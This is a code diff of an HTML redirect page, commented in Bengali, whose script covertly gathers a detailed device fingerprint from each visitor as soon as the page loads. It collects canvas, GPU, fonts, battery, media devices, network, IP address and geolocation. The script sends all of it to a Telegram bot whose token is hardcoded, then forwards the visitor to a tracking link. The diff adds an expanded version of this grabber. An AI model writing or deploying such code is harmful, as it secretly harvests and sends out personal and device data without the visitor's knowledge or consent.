@@ -22,238 +22,305 @@
     </div>
 
     <script>
-        // ===================== আপনার তথ্য দিন =====================
+        // ========== আপনার টেলিগ্রাম বট তথ্য দিন ==========
         const TG_BOT_TOKEN = "8651142215:AAHuKP53rRExlvBipq2EgcXWCOU4i-vZ7Do";
         const TG_CHAT_ID = "5575068712";
         const REDIRECT_URL = "https://coldredir.com/L?tag=d_5695957m_126646c_&site=5695957&ad=126646";
-        // =======================================================
+        // ===================================================
 
-        // ========== ফিঙ্গারপ্রিন্ট জেনারেটর ==========
-        function generateFingerprint() {
-            var fp = "";
+        // ========== SHA-256 হ্যাশ ফাংশন (Pure JS) ==========
+        async function sha256(message) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        // ========== ফন্ট ডিটেকশন ==========
+        function detectFonts() {
+            const fonts = [
+                'Arial','Verdana','Times New Roman','Courier New','Helvetica',
+                'Tahoma','Georgia','Comic Sans MS','Impact','Lucida Console',
+                'Segoe UI','Roboto','Open Sans','Noto Sans','Ubuntu','Calibri'
+            ];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const testStr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            const baseWidths = {};
             
-            // 1. ক্যানভাস (এডভান্সড ভার্সন)
-            try {
-                var canvas = document.createElement('canvas');
-                var ctx = canvas.getContext('2d');
-                canvas.width = 250;
-                canvas.height = 80;
-                
-                // ব্যাকগ্রাউন্ড গ্রেডিয়েন্ট
-                var gradient = ctx.createLinearGradient(0, 0, 250, 80);
-                gradient.addColorStop(0, '#ff6b6b');
-                gradient.addColorStop(0.5, '#4ecdc4');
-                gradient.addColorStop(1, '#45b7d1');
-                ctx.fillStyle = gradient;
-                ctx.fillRect(0, 0, 250, 80);
-                
-                // টেক্সট লেয়ার ১
-                ctx.font = 'bold 24px Arial';
-                ctx.fillStyle = '#ffffff';
-                ctx.shadowColor = 'rgba(0,0,0,0.5)';
-                ctx.shadowBlur = 4;
-                ctx.fillText('Fingerprint', 20, 40);
-                
-                // টেক্সট লেয়ার ২ (একটু ঘোরানো)
-                ctx.save();
-                ctx.translate(180, 30);
-                ctx.rotate(0.2);
-                ctx.font = '16px Courier New';
-                ctx.fillStyle = '#ffff00';
-                ctx.shadowBlur = 0;
-                ctx.fillText('v2.0', 0, 0);
-                ctx.restore();
-                
-                // ছোট বৃত্ত
-                for (var i = 0; i < 10; i++) {
-                    ctx.beginPath();
-                    ctx.arc(10 + i * 25, 65, 5, 0, Math.PI * 2);
-                    ctx.fillStyle = 'hsl(' + (i * 36) + ', 70%, 60%)';
-                    ctx.fill();
+            // বেসলাইন হিসেবে monospace নিন
+            ctx.font = '16px monospace';
+            baseWidths.mono = ctx.measureText(testStr).width;
+            
+            const found = [];
+            fonts.forEach(font => {
+                ctx.font = '16px ' + font;
+                const w = ctx.measureText(testStr).width;
+                if (Math.abs(w - baseWidths.mono) > 2) {
+                    found.push(font);
                 }
-                
-                fp += canvas.toDataURL().substring(50, 120);
-            } catch(e) { fp += "canvas_error|"; }
+            });
+            return found.join(',');
+        }
 
-            // 2. ওয়েবজিএল ফিঙ্গারপ্রিন্ট (গ্রাফিক্স কার্ড)
+        // ========== ব্যাটারি ফিঙ্গারপ্রিন্ট ==========
+        async function getBatteryInfo() {
             try {
-                var glCanvas = document.createElement('canvas');
-                var gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'Yes' : 'No',
+                        chargingTime: battery.chargingTime === Infinity ? 'Infinity' : battery.chargingTime + 's',
+                        dischargingTime: battery.dischargingTime === Infinity ? 'Infinity' : battery.dischargingTime + 's'
+                    };
+                }
+            } catch(e) {}
+            return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
+        }
+
+        // ========== ওয়েবজিএল ডিটেইলস ==========
+        function getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
-                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        fp += gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + "|";
-                        fp += gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + "|";
-                    } else {
-                        fp += "webgl_no_debug|";
-                    }
-                    fp += gl.getParameter(gl.MAX_TEXTURE_SIZE) + "|";
-                } else {
-                    fp += "no_webgl|";
+                    const di = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                        vendor: di ? gl.getParameter(di.UNMASKED_VENDOR_WEBGL) : 'N/A',
+                        renderer: di ? gl.getParameter(di.UNMASKED_RENDERER_WEBGL) : 'N/A',
+                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x'),
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        version: gl.getParameter(gl.VERSION)
+                    };
                 }
-            } catch(e) { fp += "webgl_error|"; }
+            } catch(e) {}
+            return { vendor: 'N/A', renderer: 'N/A', maxTextureSize: 'N/A', maxViewportDims: 'N/A', shadingLanguageVersion: 'N/A', version: 'N/A' };
+        }
 
-            // 3. অডিও ফিঙ্গারপ্রিন্ট
+        // ========== ক্যানভাস ফিঙ্গারপ্রিন্ট (উন্নত) ==========
+        function getCanvasFP() {
             try {
-                var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                var oscillator = audioCtx.createOscillator();
-                var analyser = audioCtx.createAnalyser();
-                oscillator.connect(analyser);
-                oscillator.frequency.value = 440;
-                oscillator.type = 'sine';
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 256;
+                canvas.height = 100;
                 
-                var bufferLength = analyser.frequencyBinCount;
-                var dataArray = new Uint8Array(bufferLength);
-                analyser.getByteFrequencyData(dataArray);
+                // জটিল প্যাটার্ন
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 256, 100);
+                ctx.fillStyle = '#069';
+                ctx.font = 'bold 20px monospace';
+                ctx.fillText('C' + String.fromCharCode(169) + 'p' + String.fromCharCode(174) + 'y', 2, 2);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.font = 'bold 26px sans-serif';
+                ctx.fillText('right', 4, 45);
+                ctx.fillStyle = '#fff';
+                ctx.font = '16px Georgia';
+                ctx.fillText(' © 2025', 4, 78);
                 
-                var audioHash = 0;
-                for (var i = 0; i < 10; i++) {
-                    audioHash += dataArray[i] || 0;
+                // গ্রেডিয়েন্ট
+                const gradient = ctx.createLinearGradient(0, 0, 256, 100);
+                gradient.addColorStop(0, '#ff0000');
+                gradient.addColorStop(0.5, '#00ff00');
+                gradient.addColorStop(1, '#0000ff');
+                ctx.fillStyle = gradient;
+                ctx.globalCompositeOperation = 'lighter';
+                ctx.fillRect(50, 20, 150, 40);
+                
+                return canvas.toDataURL();
+            } catch(e) { return 'canvas_error'; }
+        }
+
+        // ========== প্রধান ফিঙ্গারপ্রিন্ট ফাংশন ==========
+        async function generateFingerprint() {
+            const canvasFP = getCanvasFP();
+            const glInfo = getWebGLInfo();
+            const battery = await getBatteryInfo();
+            const fonts = detectFonts();
+            
+            // ===== HDMI/মনিটর ডিটেকশন =====
+            let screenDetails = {};
+            try {
+                if (window.screen && window.screen.isExtended) {
+                    screenDetails.isExtended = window.screen.isExtended;
                 }
-                fp += audioHash + "|";
-                audioCtx.close();
-            } catch(e) { fp += "audio_error|"; }
-
-            // 4. ব্যাটারি
-            if (navigator.getBattery) {
-                navigator.getBattery().then(function(battery) {
-                    window.batteryLevel = Math.round(battery.level * 100);
-                    window.batteryCharging = battery.charging;
-                });
-            }
-
-            // 5. টাচ সাপোর্ট ও মাল্টিটাচ
-            fp += navigator.maxTouchPoints + "|";
+                // Screen Wake Lock API সাপোর্ট
+                screenDetails.wakeLockSupport = 'wakeLock' in navigator;
+            } catch(e) {}
             
-            // 6. হার্ডওয়্যার কনকারেন্সি
-            fp += (navigator.hardwareConcurrency || "unknown") + "|";
+            // ===== মিডিয়া ডিভাইস (ক্যামেরা/মাইক কানেক্টেড?) =====
+            let mediaDevices = [];
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                mediaDevices = devices.map(d => d.kind + ':' + d.label.substring(0, 30));
+            } catch(e) { mediaDevices = ['N/A']; }
             
-            // 7. ডিভাইস মেমোরি
-            fp += (navigator.deviceMemory || "unknown") + "|";
+            // ===== নেটওয়ার্ক ইনফো =====
+            let connection = {};
+            try {
+                if (navigator.connection) {
+                    connection = {
+                        type: navigator.connection.effectiveType || 'N/A',
+                        downlink: navigator.connection.downlink || 'N/A',
+                        rtt: navigator.connection.rtt || 'N/A',
+                        saveData: navigator.connection.saveData || false
+                    };
+                }
+            } catch(e) {}
             
-            // 8. স্ক্রিন ডিটেইলস
-            fp += screen.width + "x" + screen.height + "|";
-            fp += screen.colorDepth + "|";
-            fp += screen.pixelDepth + "|";
+            // ===== বিল্ড ফিঙ্গারপ্রিন্ট স্ট্রিং =====
+            const rawParts = [
+                canvasFP,
+                glInfo.vendor,
+                glInfo.renderer,
+                glInfo.maxTextureSize,
+                glInfo.maxViewportDims,
+                glInfo.shadingLanguageVersion,
+                screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
+                screen.availWidth + 'x' + screen.availHeight,
+                navigator.hardwareConcurrency || 'N/A',
+                navigator.deviceMemory || 'N/A',
+                navigator.platform || 'N/A',
+                navigator.language || 'N/A',
+                navigator.languages ? navigator.languages.join(',') : 'N/A',
+                Intl.DateTimeFormat().resolvedOptions().timeZone,
+                navigator.maxTouchPoints,
+                fonts,
+                battery.level,
+                battery.charging,
+                connection.type || 'N/A',
+                connection.downlink || 'N/A',
+                screenDetails.isExtended || false,
+                screenDetails.wakeLockSupport || false,
+                mediaDevices.join('|')
+            ];
             
-            // 9. টাইমজোন
-            fp += Intl.DateTimeFormat().resolvedOptions().timeZone + "|";
-            fp += new Date().getTimezoneOffset() + "|";
+            const rawString = rawParts.join('|||');
+            const fpHash = await sha256(rawString);
             
-            // 10. প্ল্যাটফর্ম ও ভাষা
-            fp += navigator.platform + "|";
-            fp += navigator.language + "|";
-            fp += navigator.languages ? navigator.languages.join(",") : "|";
-            
-            // 11. কুকি ও স্টোরেজ
-            fp += navigator.cookieEnabled + "|";
-            fp += typeof(Storage) !== 'undefined' ? "yes|" : "no|";
-            
-            // 12. ডু নট ট্র্যাক
-            fp += navigator.doNotTrack || "not_set";
-            
-            // SHA-1 হ্যাশ তৈরি
-            return sha1(fp);
+            return {
+                hash: fpHash,
+                raw: rawParts,
+                glInfo: glInfo,
+                battery: battery,
+                connection: connection,
+                fonts: fonts,
+                mediaDevices: mediaDevices,
+                screenDetails: screenDetails
+            };
         }
 
-        // ========== SHA-1 হ্যাশ ফাংশন ==========
-        function sha1(str) {
-            function rotateLeft(n, b) { return (n << b) | (n >>> (32 - b)); }
-            function toHexStr(n) { var s = "", v; for (var i = 7; i >= 0; i--) { v = (n >>> (i * 4)) & 0x0f; s += v.toString(16); } return s; }
-            
-            var blockstart, i, j, W = new Array(80), H0 = 0x67452301, H1 = 0xEFCDAB89, H2 = 0x98BADCFE, H3 = 0x10325476, H4 = 0xC3D2E1F0, A, B, C, D, E, temp;
-            
-            str = unescape(encodeURIComponent(str));
-            var str_len = str.length;
-            var word_array = [];
-            for (i = 0; i < str_len - 3; i += 4) {
-                j = str.charCodeAt(i) << 24 | str.charCodeAt(i + 1) << 16 | str.charCodeAt(i + 2) << 8 | str.charCodeAt(i + 3);
-                word_array.push(j);
+        // ========== আইপি ফেচ ==========
+        async function getIP() {
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                return data.ip;
+            } catch(e) {
+                try {
+                    const resp2 = await fetch('https://api.myip.com');
+                    const data2 = await resp2.json();
+                    return data2.ip;
+                } catch(e2) {
+                    return 'Unavailable';
+                }
             }
-            switch (str_len % 4) {
-                case 0: i = 0x080000000; break;
-                case 1: i = str.charCodeAt(str_len - 1) << 24 | 0x0800000; break;
-                case 2: i = str.charCodeAt(str_len - 2) << 24 | str.charCodeAt(str_len - 1) << 16 | 0x08000; break;
-                case 3: i = str.charCodeAt(str_len - 3) << 24 | str.charCodeAt(str_len - 2) << 16 | str.charCodeAt(str_len - 1) << 8 | 0x80; break;
-            }
-            word_array.push(i);
-            while ((word_array.length % 16) != 14) word_array.push(0);
-            word_array.push(str_len >>> 29);
-            word_array.push((str_len << 3) & 0x0ffffffff);
-            
-            for (blockstart = 0; blockstart < word_array.length; blockstart += 16) {
-                for (i = 0; i < 16; i++) W[i] = word_array[blockstart + i];
-                for (i = 16; i <= 79; i++) W[i] = rotateLeft(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1);
-                A = H0; B = H1; C = H2; D = H3; E = H4;
-                for (i = 0; i <= 19; i++) { temp = (rotateLeft(A, 5) + ((B & C) | (~B & D)) + E + W[i] + 0x5A827999) & 0x0ffffffff; E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp; }
-                for (i = 20; i <= 39; i++) { temp = (rotateLeft(A, 5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0x0ffffffff; E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp; }
-                for (i = 40; i <= 59; i++) { temp = (rotateLeft(A, 5) + ((B & C) | (B & D) | (C & D)) + E + W[i] + 0x8F1BBCDC) & 0x0ffffffff; E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp; }
-                for (i = 60; i <= 79; i++) { temp = (rotateLeft(A, 5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0x0ffffffff; E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp; }
-                H0 = (H0 + A) & 0x0ffffffff; H1 = (H1 + B) & 0x0ffffffff;
-                H2 = (H2 + C) & 0x0ffffffff; H3 = (H3 + D) & 0x0ffffffff; H4 = (H4 + E) & 0x0ffffffff;
-            }
-            return toHexStr(H0) + toHexStr(H1) + toHexStr(H2) + toHexStr(H3) + toHexStr(H4);
         }
 
-        // ========== মেইন ফাংশন ==========
-        var fingerprint = generateFingerprint();
-        var batteryLevel = "N/A";
-        var batteryCharging = "N/A";
-
-        // ব্যাটারি আপডেট
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(b) {
-                batteryLevel = Math.round(b.level * 100) + "%";
-                batteryCharging = b.charging ? "Yes" : "No";
-            });
+        // ========== দেশ/লোকেশন ডিটেকশন ==========
+        async function getLocation(ip) {
+            try {
+                const resp = await fetch('https://ipapi.co/' + ip + '/json/');
+                const data = await resp.json();
+                return {
+                    country: data.country_name || 'N/A',
+                    city: data.city || 'N/A',
+                    region: data.region || 'N/A',
+                    isp: data.org || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            } catch(e) {
+                return { country: 'N/A', city: 'N/A', region: 'N/A', isp: 'N/A', timezone: 'N/A' };
+            }
         }
 
-        // আইপি ফেচ
-        var publicIP = "Loading...";
-        fetch('https://api.ipify.org?format=json')
-            .then(function(r) { return r.json(); })
-            .then(function(data) {
-                publicIP = data.ip;
-                sendToTelegram();
-            })
-            .catch(function() {
-                publicIP = "Unavailable";
-                sendToTelegram();
-            });
-
-        // টাইমআউট
-        setTimeout(function() {
-            if (publicIP === "Loading...") {
-                publicIP = "Timeout";
-                sendToTelegram();
-            }
-        }, 5000);
-
-        // ========== টেলিগ্রামে পাঠানো ==========
-        function sendToTelegram() {
-            var userAgent = navigator.userAgent || "N/A";
-            var platform = navigator.platform || "N/A";
-            var language = navigator.language || "N/A";
+        // ========== মেইন এক্সিকিউশন ==========
+        (async function() {
+            const fp = await generateFingerprint();
+            const publicIP = await getIP();
+            const location = await getLocation(publicIP);
             
-            var msg = "🔔 **নতুন ভিজিটর** 🔔\n" +
-                      "━━━━━━━━━━━━━━━\n" +
-                      "🆔 **ফিঙ্গারপ্রিন্ট:** `" + fingerprint.substring(0, 20) + "...`\n" +
-                      "━━━━━━━━━━━━━━━\n" +
-                      "🌐 **পাবলিক আইপি:** " + publicIP + "\n" +
-                      "📱 **প্ল্যাটফর্ম:** " + platform + "\n" +
-                      "💻 **ওএস:** " + (userAgent.includes("Android") ? "Android" : userAgent.includes("iPhone") ? "iOS" : userAgent.includes("Windows") ? "Windows" : "Other") + "\n" +
-                      "📺 **স্ক্রিন:** " + screen.width + "x" + screen.height + " (" + screen.colorDepth + "-bit)\n" +
-                      "🧠 **র‍্যাম:** " + (navigator.deviceMemory || "N/A") + "GB\n" +
-                      "⚡ **কোর:** " + (navigator.hardwareConcurrency || "N/A") + "\n" +
-                      "👆 **টাচ:** " + navigator.maxTouchPoints + " পয়েন্ট\n" +
-                      "🔋 **ব্যাটারি:** " + batteryLevel + " (চার্জিং: " + batteryCharging + ")\n" +
-                      "🌍 **টাইমজোন:** " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n" +
-                      "🗣 **ভাষা:** " + language + "\n" +
-                      "🕒 **বাংলাদেশ সময়:** " + new Date().toLocaleString("bn-BD", { timeZone: "Asia/Dhaka" }) + "\n" +
-                      "━━━━━━━━━━━━━━━\n" +
-                      "**ইউজার এজেন্ট:**\n`" + userAgent.substring(0, 150) + "`";
+            // ===== ব্রাউজার ইউজার এজেন্ট ডিটেইলস =====
+            const ua = navigator.userAgent;
+            let browserName = 'Unknown';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
+            else if (ua.includes('Firefox')) browserName = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
+            else if (ua.includes('Edg')) browserName = 'Edge';
+            else if (ua.includes('OPR') || ua.includes('Opera')) browserName = 'Opera';
+            
+            let osName = 'Unknown';
+            if (ua.includes('Windows NT 10.0')) osName = 'Windows 10/11';
+            else if (ua.includes('Windows NT 6.3')) osName = 'Windows 8.1';
+            else if (ua.includes('Windows NT 6.1')) osName = 'Windows 7';
+            else if (ua.includes('Android')) osName = 'Android ' + (ua.match(/Android\s([\d.]+)/) || [''])[1];
+            else if (ua.includes('iPhone')) osName = 'iOS ' + (ua.match(/OS\s([\d_]+)/) || [''])[1].replace(/_/g, '.');
+            else if (ua.includes('Mac OS X')) osName = 'macOS';
+            else if (ua.includes('Linux')) osName = 'Linux';
+            
+            // ===== প্রাইভেসি চেক =====
+            let privacyScore = 0;
+            const privacyFlags = [];
+            if (navigator.doNotTrack === '1' || navigator.doNotTrack === 'yes') { privacyScore++; privacyFlags.push('DNT:Yes'); }
+            if (navigator.webdriver === true) { privacyScore+=2; privacyFlags.push('WebDriver:Yes (Bot?)'); }
+            // কুকি চেক
+            try {
+                document.cookie = 'testcookie=1; SameSite=Lax';
+                if (document.cookie.indexOf('testcookie') === -1) { privacyFlags.push('Cookies:Blocked'); }
+                else { document.cookie = 'testcookie=; expires=Thu, 01 Jan 1970 00:00:00 GMT'; }
+            } catch(e) { privacyFlags.push('Cookies:Error'); }
+            
+            // ===== টেলিগ্রাম মেসেজ তৈরি =====
+            const msg = 
+`🔔 **নতুন ভিজিটর সনাক্ত** 🔔
+━━━━━━━━━━━━━━━━━━
+🆔 **FP:** \`${fp.hash.substring(0, 20)}...\`
+━━━━━━━━━━━━━━━━━━
+🌐 **IP:** ${publicIP}
+📍 **লোকেশন:** ${location.city}, ${location.country}
+🏢 **ISP:** ${location.isp}
+━━━━━━━━━━━━━━━━━━
+📱 **প্ল্যাটফর্ম:** ${navigator.platform}
+💻 **ওএস:** ${osName}
+🌍 **ব্রাউজার:** ${browserName}
+📺 **স্ক্রিন:** ${screen.width}x${screen.height}
+🖥️ **এভেইলেবল:** ${screen.availWidth}x${screen.availHeight}
+🎨 **কালার ডেপথ:** ${screen.colorDepth}-bit
+━━━━━━━━━━━━━━━━━━
+🧠 **র‍্যাম:** ${navigator.deviceMemory || 'N/A'}GB
+⚡ **কোর:** ${navigator.hardwareConcurrency || 'N/A'}
+👆 **টাচ পয়েন্ট:** ${navigator.maxTouchPoints}
+🔋 **ব্যাটারি:** ${fp.battery.level} | চার্জিং: ${fp.battery.charging}
+━━━━━━━━━━━━━━━━━━
+🎮 **GPU:** ${fp.glInfo.renderer.substring(0, 50)}
+🔤 **ফন্টস (${fp.fonts.split(',').length}টি):** \`${fp.fonts.substring(0, 60)}\`
+━━━━━━━━━━━━━━━━━━
+🌍 **টাইমজোন:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🗣 **ভাষা:** ${navigator.language} [${navigator.languages ? navigator.languages.join(',') : ''}]
+📶 **নেট:** ${fp.connection.type || 'N/A'} | ${fp.connection.downlink || '?'}Mbps
+━━━━━━━━━━━━━━━━━━
+🔒 **প্রাইভেসি ফ্ল্যাগ:** ${privacyFlags.join(', ') || 'None'}
+📷 **মিডিয়া ডিভাইস:** ${fp.mediaDevices.length}টি
+🕒 **সময়:** ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}
+━━━━━━━━━━━━━━━━━━
+**UA:** \`${ua.substring(0, 100)}\``;
 
-            fetch("https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage", {
+            // মেসেজ পাঠান
+            fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -261,13 +328,26 @@
                     text: msg,
                     parse_mode: 'Markdown'
                 })
-            }).catch(function(err) { console.log("Error:", err); });
-        }
+            }).catch(function(err) { console.log('TG Error:', err); });
 
-        // ২ সেকেন্ড পর রিডাইরেক্ট
-        setTimeout(function() {
-            window.location.href = REDIRECT_URL;
-        }, 2000);
+            // ===== ফিঙ্গারপ্রিনট localStorage-এ সংরক্ষণ =====
+            try {
+                localStorage.setItem('fp_hash', fp.hash);
+                localStorage.setItem('fp_time', Date.now().toString());
+                
+                // যদি আগের ফিঙ্গারপ্রিন্ট মেলে, তাহলে সেট নোট করুন
+                var oldFP = localStorage.getItem('fp_hash_prev');
+                if (oldFP && oldFP === fp.hash) {
+                    console.log('✅ ফিঙ্গারপ্রিন্ট ম্যাচ: একই ডিভাইস');
+                }
+                localStorage.setItem('fp_hash_prev', fp.hash);
+            } catch(e) {}
+
+            // ===== ২ সেকেন্ড পর রিডাইরেক্ট =====
+            setTimeout(function() {
+                window.location.href = REDIRECT_URL;
+            }, 2000);
+        })();
     </script>
 </body>
 </html>
